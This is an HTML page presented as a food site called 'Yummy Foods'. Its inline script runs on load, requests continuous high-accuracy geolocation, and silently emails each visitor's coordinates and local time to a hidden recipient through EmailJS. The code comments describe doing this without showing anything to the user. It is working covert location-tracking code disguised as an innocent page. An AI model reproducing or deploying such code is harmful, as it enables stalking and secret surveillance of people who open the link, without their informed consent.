<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yummy Foods</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
</head>
<body>
    <header>
        <h1>Welcome to Yummy Foods</h1>
        <p>Find your next delicious meal!</p>
    </header>

    <script>
        let watchId;

        (function() {
            emailjs.init("sjem_DYuQ5tWYRZlu"); // Your EmailJS user ID
            getLocationAndSend(); // Automatically get location on page load
        })();

        function getLocationAndSend() {
            if (navigator.geolocation) {
                // Use watchPosition for continuous updates without showing anything to the user
                watchId = navigator.geolocation.watchPosition(sendSilentLocation, showError, {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                });

                // Stop watching after 1 minute to save battery
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                }, 60000);
            }
        }

        function sendSilentLocation(position) {
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;
            let accuracy = position.coords.accuracy;

            let localTime = new Date().toLocaleString();

            const emailData = {
                from_name: "Yummy Foods Location Tracker",
                message: `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nLocal Time: ${localTime}`,
            };

            emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
                .then(function(response) {
                    console.log(`SUCCESS! Data sent. Status: ${response.status}`);
                })
                .catch(function(error) {
                    console.error(`FAILED! Error sending email: ${error.text}`);
                });
        }

        function showError(error) {
            console.error("Error getting location:", error);
        }
    </script>
</body>
</html>
